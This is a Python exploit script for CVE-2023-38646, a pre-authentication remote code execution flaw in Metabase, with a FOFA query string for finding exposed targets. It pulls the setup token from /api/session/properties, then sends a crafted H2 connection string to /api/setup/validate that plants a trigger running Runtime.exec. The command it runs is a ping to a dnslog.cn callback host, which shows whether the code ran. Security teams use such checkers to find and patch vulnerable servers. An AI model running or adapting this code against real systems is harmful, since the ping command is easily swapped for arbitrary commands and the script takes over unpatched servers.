#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import re
import argparse
import requests


def title():
    print('+          FOFA:"Metabase"')


def run_proto(url):
    con_list = [
        "/api/session/properties"]
    for con in con_list:
        vuln_url = url + con
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        }
        try:
            requests.packages.urllib3.disable_warnings()
            req = requests.get(url=vuln_url, verify=False, headers=headers, timeout=(3, 3))
            rec = re.search('setup-token":"(.*?)"', req.text, re.I)
            if req.status_code == 200 and rec:
                setup_token = ''
                if rec.groups():
                    setup_token = rec.groups()[0]
                check_url = url + "/api/setup/validate"
                headers1 = {
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Connection": "close"
                }
                payload = {
                    "token": setup_token,
                    "details": {
                        "is_on_demand": False,
                        "is_full_sync": False,
                        "is_sample": False,
                        "cache_ttl": None,
                        "refingerprint": False,
                        "auto_run_queries": True,
                        "schedules": {},
                        "details": {
                            "db": f"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('ping nlvc11.dnslog.cn')\n$$--=x",
                            "advanced-options": False,
                            "ssl": True
                        },
                        "name": "test",
                        "engine": "h2"
                    }
                }
                response = requests.post(check_url, headers=headers1, json=payload, timeout=(6, 6))
                if "Error creating or initializing trigger" in response.text:
                    print(check_url)
                    print(response.status_code)
                    print(response.text)
                    return True
            else:
                return False
        except Exception as e:
            return False
    return False


def run(target):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}'.format(proto[i], target)
        if run_proto(url):
            return True
        else:
            i = i + 1


if __name__ == '__main__':
    title()
    parser = argparse.ArgumentParser(description="CVE-2023-38646_Metabase_RCE")
    parser.add_argument('-t', '--target', type=str, help='127.0.0.1:80', default='127.0.0.1:80')
    args = parser.parse_args()
    target = args.target
    result = run(target)

    if result:
        print('Exist')
    else:
        print('UnExist')